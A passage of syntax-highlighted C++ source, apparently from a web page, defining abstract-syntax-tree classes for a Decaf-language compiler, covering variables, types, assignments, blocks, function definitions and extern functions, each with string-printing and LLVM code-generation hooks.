class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Not&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> nottmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Lt&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> slttmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Gt&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> sgttmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Leq&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> sletmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Geq&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> sgetmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Leftshift&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> shltmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Rightshift&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> shrtmp;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafUnaryexp</span> :</span> <span class="keyword">public</span> decafBinexp &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafUnaryexp</span>()&#123;&#125;</span><br><span class="line">	<span class="built_in">decafUnaryexp</span>(string op, decafBinexp *exp1)&#123;</span><br><span class="line">		decafBinexp::Option = op;</span><br><span class="line">		decafBinexp::Exp1 = exp1;</span><br><span class="line">		decafBinexp::Exp2 = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">this</span>-&gt;des.kind = expuK;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;UnaryExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Option + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp1) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafType</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Type;</span><br><span class="line">	string Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvm::Type* lType;</span><br><span class="line">	llvmType Ty;</span><br><span class="line">	<span class="function">string <span class="title">get_type</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Type; &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="built_in">decafType</span>(string Type)&#123;<span class="keyword">this</span>-&gt;Type = Type;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(Name != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafVar</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Type;</span><br><span class="line">	string Name;</span><br><span class="line">	string Kind;</span><br><span class="line">	decafAllexp* Exp;</span><br><span class="line">	decafAllexp* Arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvm::AllocaInst *Alloca;</span><br><span class="line">	llvm::Type* lType;</span><br><span class="line">	<span class="built_in">decafVar</span>(string Name) &#123;<span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_type</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Type;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_kind</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Kind;&#125;</span><br><span class="line">	<span class="function">decafAllexp* <span class="title">get_arr</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Arr;&#125;</span><br><span class="line">	<span class="function">decafAllexp* <span class="title">get_exp</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Exp;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(decafType* type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;Type = type-&gt;<span class="built_in">get_type</span>();</span><br><span class="line">		<span class="keyword">this</span>-&gt;lType = type-&gt;lType;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string Name)</span></span>&#123;<span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_kind</span><span class="params">(string Kind)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Kind == <span class="string">&quot;&quot;</span>)</span><br><span class="line">			<span class="keyword">this</span>-&gt;Kind = Kind;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_arr</span><span class="params">(decafAllexp* Arr)</span></span>&#123;<span class="keyword">this</span>-&gt;Arr = Arr;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_exp</span><span class="params">(decafAllexp* Exp)</span></span>&#123;<span class="keyword">this</span>-&gt;Exp = Exp;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">if</span>(Exp != <span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;AssignGlobalVar(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Exp)+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(Kind != <span class="string">&quot;&quot;</span> &amp;&amp; Name != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;FieldDecl(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;,&quot;</span>+Kind+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;	</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(Name != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafVarList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafVar*&gt; List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">list&lt;decafVar*&gt; <span class="title">get_list</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;List; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafVar *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafVar *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">cat_front</span><span class="params">(decafVarList* List)</span> </span>&#123;</span><br><span class="line">		list&lt;decafVar*&gt; l = List-&gt;<span class="built_in">get_list</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:l)&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;List.<span class="built_in">push_front</span>(e); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_types</span><span class="params">(decafType* Type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_type</span>(Type); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_kinds</span><span class="params">(string Kind)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_kind</span>(Kind); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> commaList&lt;class decafVar *&gt;(List);&#125;</span><br><span class="line">	<span class="function">llvm::Value * <span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafVar *&gt;(List); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafOutput</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Data;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafOutput</span>(string Data)&#123;<span class="keyword">this</span>-&gt;Data = Data;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Data; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafPara</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafType *&gt; Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Para.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafType *e)</span> </span>&#123; Para.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafType *e)</span> </span>&#123; Para.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">list&lt;decafType *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> Para; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafType *&gt;(Para); &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafStmt</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvmStmt kind;</span><br><span class="line">	<span class="built_in">decafStmt</span>()&#123;&#125;</span><br><span class="line">	<span class="function">llvm::Value * <span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafStmts</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafStmt *&gt; stmts;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafStmts</span>() &#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> stmts.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafStmt *e)</span> </span>&#123; stmts.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafStmt *e)</span> </span>&#123; stmts.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">list&lt;decafStmt *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> stmts; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafStmt *&gt;(stmts); &#125;</span><br><span class="line">	<span class="function">llvm::Value * <span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		llvm::Value* v = listCodegen&lt;decafStmt *&gt;(stmts); </span><br><span class="line">		<span class="keyword">return</span> v;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFunCall</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	list&lt;decafAST *&gt; Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafFunCall</span>()&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;kind = dcall; </span><br><span class="line">		<span class="keyword">this</span>-&gt;des.kind = funcK;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(list&lt;decafAST *&gt;  Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Para.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function">list&lt;decafAST *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Para; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;MethodCall&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + commaList&lt;class decafAST *&gt;(Para) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAssign</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	string Var;</span><br><span class="line">	<span class="keyword">bool</span> key;</span><br><span class="line">	decafAllexp* Arr;</span><br><span class="line">	decafBinexp* Exp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_arr</span><span class="params">(decafAllexp* Arr)</span></span>&#123;<span class="keyword">this</span>-&gt;Arr = Arr;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_key</span><span class="params">(<span class="keyword">bool</span> key)</span></span>&#123;<span class="keyword">this</span>-&gt;key = key;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_var</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Var; &#125;</span><br><span class="line">	<span class="function">decafBinexp* <span class="title">get_exp</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Exp; &#125;</span><br><span class="line">	<span class="built_in">decafAssign</span>(string Var, decafBinexp* Exp):<span class="built_in">Var</span>(Var),<span class="built_in">Exp</span>(Exp)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">if</span>(Arr == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;AssignVar&quot;</span>) + <span class="string">&quot;(&quot;</span> + Var + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;AssignArrayLoc&quot;</span>) + <span class="string">&quot;(&quot;</span> + Var + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Arr)+<span class="string">&quot;,&quot;</span>+ <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAssignList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafAssign *&gt;List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafAssign *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafAssign *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_keys</span><span class="params">(<span class="keyword">bool</span> key)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> ass:List)&#123;</span><br><span class="line">			ass-&gt;<span class="built_in">put_key</span>(key);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> commaList&lt;class decafAssign *&gt;(List);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafAssign *&gt;(List); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafBlock</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	string BloKind;</span><br><span class="line">	decafVarList *FieldDeclList;</span><br><span class="line">	decafStmts *StateDeclList;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafBlock</span>(string blokind,decafVarList *fieldlist, decafStmts *methodlist) </span><br><span class="line">		: <span class="built_in">BloKind</span>(blokind), <span class="built_in">FieldDeclList</span>(fieldlist), <span class="built_in">StateDeclList</span>(methodlist) &#123; <span class="keyword">this</span>-&gt;kind = dblo; &#125;</span><br><span class="line">	~<span class="built_in">decafBlock</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (FieldDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> FieldDeclList; &#125;</span><br><span class="line">		<span class="keyword">if</span> (StateDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> StateDeclList; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> BloKind + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(FieldDeclList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(StateDeclList) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFuncDef</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	string Type;</span><br><span class="line">	decafPara * Para;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvm::Type *lType;</span><br><span class="line">	llvm::Function *lfunc;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(decafPara * Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(decafType* type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;Type = type-&gt;<span class="built_in">get_type</span>();</span><br><span class="line">		<span class="keyword">this</span>-&gt;lType = type-&gt;lType;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_block</span><span class="params">(decafBlock *Block)</span></span>&#123; <span class="keyword">this</span>-&gt;Block = Block; &#125;</span><br><span class="line">	<span class="function">decafBlock *<span class="title">get_block</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Block; &#125;</span><br><span class="line">	<span class="function">decafPara *<span class="title">get_para</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Para; &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Method&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + Type + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Para) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFuncDefList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafFuncDef*&gt; List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">list&lt;decafFuncDef*&gt; <span class="title">get_list</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;List; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafFuncDef *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafFuncDef *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">cat_front</span><span class="params">(decafFuncDefList* List)</span> </span>&#123;</span><br><span class="line">		list&lt;decafFuncDef*&gt; l = List-&gt;<span class="built_in">get_list</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:l)&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;List.<span class="built_in">push_front</span>(e); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_types</span><span class="params">(decafType* Type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_type</span>(Type); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> commaList&lt;class decafFuncDef *&gt;(List);&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafFuncDef *&gt;(List); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafEXFuncDef</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	string Type;</span><br><span class="line">	decafPara* Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvm::Type *lType;</span><br><span class="line">	llvm::Function *lfunc;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(decafPara* Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(decafType* type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;Type = type-&gt;<span class="built_in">get_type</span>();</span><br><span class="line">		<span class="keyword">this</span>-&gt;lType = type-&gt;lType;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_type</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Type; &#125;</span><br><span class="line">	<span class="function">decafPara* <span class="title">get_para</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Para; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ExternFunction&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + Type + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Para) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafEXFuncDefList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafEXFuncDef*&gt; List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">list&lt;decafEXFuncDef*&gt; <span class="title">get_list</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;List; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafEXFuncDef *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span 